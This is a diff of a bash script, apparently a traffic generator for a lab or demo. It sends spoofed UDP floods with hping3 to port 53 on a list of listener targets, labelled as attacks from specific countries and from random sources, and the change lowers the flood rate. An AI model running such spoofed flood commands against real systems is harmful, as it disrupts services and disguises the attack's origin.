@@ -53,19 +53,19 @@ do
 
             #--- Attacks by Country -----
             echo -e "Attack from China (1.92.0.10), on DNS.. \r\n"
-            sudo hping3 --flood --udp -p 53 --spoof 1.92.0.10 ${sitelistener[$i]} > /dev/null 2>&1
+            sudo hping3 --udp -p 53 --faster --spoof 1.92.0.10 ${sitelistener[$i]} > /dev/null 2>&1
 
             echo -e "Attack from Russia (2.72.0.10), on DNS.. \r\n"
-            sudo hping3 --flood --udp -p 53 --spoof 2.72.0.10 ${sitelistener[$i]} > /dev/null 2>&1
+            sudo hping3 --udp -p 53 --faster --spoof 2.72.0.10 ${sitelistener[$i]} > /dev/null 2>&1
 
             echo -e "Attack from Nigeria (77.70.128.10), on DNS.. \r\n"
-            sudo hping3 --flood --udp -p 53 --spoof 77.70.128.10 ${sitelistener[$i]} > /dev/null 2>&1
+            sudo hping3 --udp -p 53 --faster --spoof 77.70.128.10 ${sitelistener[$i]} > /dev/null 2>&1
 
             echo -e "Running HPing3 DNS flood attack script, toward port 53, from random sources... \r\n "
-            sudo hping3 --flood --rand-source --udp -p 53 ${sitelistener[$i]} > /dev/null 2>&1
+            sudo hping3 --rand-source --faster --udp -p 53 ${sitelistener[$i]} > /dev/null 2>&1
 
             #-----------------------------------------------------------------------------------------------------------------
-            RATE=5000
+            RATE=100
             SAMPLES=1000000000
             NPING_SILENT='-HNq'
             VALID_DNS_QUERY="000001000001000000000000037177650474657374036c61620000010001"
